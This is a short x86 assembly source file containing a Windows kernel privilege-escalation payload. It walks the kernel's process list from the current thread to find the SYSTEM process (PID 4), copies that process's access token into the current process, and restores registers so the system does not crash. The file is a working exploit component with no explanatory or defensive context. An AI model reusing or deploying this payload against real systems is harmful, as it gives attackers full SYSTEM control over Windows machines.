.686
.model flat,stdcall
assume fs:nothing

.code
payload proc
	pushad
	xor eax, eax
	;KPCR -> KPRCB -> _KTHREAD (current thread)
	mov eax, fs:[eax + 124h]
	; _KTHREAD -> _EPROCESS
	mov eax, [eax + 50h]
	; Save current EPROCESS address and loop through to find a process running as system
	mov ebx, eax
	mov edx, 4

CheckOwner:
	mov eax, [eax + 0b8h]
	sub eax, 0b8h
	cmp [eax + 0b4h], edx
	jne CheckOwner

	; Copy system Token to current process and cleanup to return to prevent BSOD
	mov ecx, [eax + 0f8h]
	mov [ebx + 0f8h], ecx

	popad
	ret
payload endp
end